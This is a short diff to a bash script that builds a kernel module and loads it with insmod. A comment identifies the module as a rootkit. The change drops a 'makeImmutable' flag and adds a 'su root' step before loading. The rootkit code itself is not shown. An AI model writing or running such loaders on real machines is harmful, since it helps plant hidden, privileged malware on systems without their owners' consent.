@@ -1,13 +1,11 @@
 #!/bin/bash
-
-makeImmutable=true
-
 make
 
 koFile=$(ls *.ko)
 hFile=$(ls *.h)
 if test -f "$koFile"; then
-    
+    su root
+
     # Load the rootkit's kernel module:
     insmod "$koFile"
     echo "Loaded."
